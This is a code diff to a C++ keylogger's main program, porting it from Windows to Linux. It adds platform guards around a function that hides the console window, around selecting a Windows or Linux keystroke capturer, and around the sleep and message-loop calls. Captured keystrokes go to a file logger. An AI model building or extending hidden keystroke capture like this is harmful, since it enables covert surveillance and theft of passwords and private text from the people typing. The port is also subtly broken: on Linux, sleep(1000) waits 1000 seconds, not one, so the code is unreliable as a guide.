@@ -10,7 +10,12 @@
 
 #include <iostream>
 #include <thread>
-#include <windows.h>
+
+#ifdef _WIN32
+    #include <windows.h>
+#else
+    #include <unistd.h>
+#endif
 
 Keylogger::IKeycodeMapper* getMapperByStr(std::string mapper) {
     if (mapper == "us") {
@@ -20,13 +25,19 @@ Keylogger::IKeycodeMapper* getMapperByStr(std::string mapper) {
 }
 
 void hideConsole() {
+#ifdef _WIN32
     ShowWindow(GetConsoleWindow(), SW_HIDE);
+#endif
 }
 
 void printSandboxState(Keylogger::SandboxListener* sandbox) {
     while (true) {
         std::cout << std::endl << "Type '" << sandbox->getExitSeq(true) << "' to exit the sandbox." << std::endl;
+#ifdef _WIN32
         Sleep(1000);
+#else
+        sleep(1000);
+#endif
     }
 }
 
@@ -115,7 +126,11 @@ available keycode maps:\n\
     Keylogger::FileLogger logger;
     Keylogger::StdoutLogger loggerStdout;
 
+#ifdef _WIN32
     Keylogger::KeystrokeCapturerWindows capturer;
+#elif __linux__
+    Keylogger::KeystrokeCapturerLinux capturer;
+#endif
 
     if (keycodesLog) {
         loggerBin.open(
@@ -156,11 +171,13 @@ available keycode maps:\n\
         });
     }
 
+#ifdef _WIN32
     MSG msg;
     while (!GetMessage(&msg, NULL, NULL, NULL)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
+#endif
 
     capturer.stop();
     return 0;
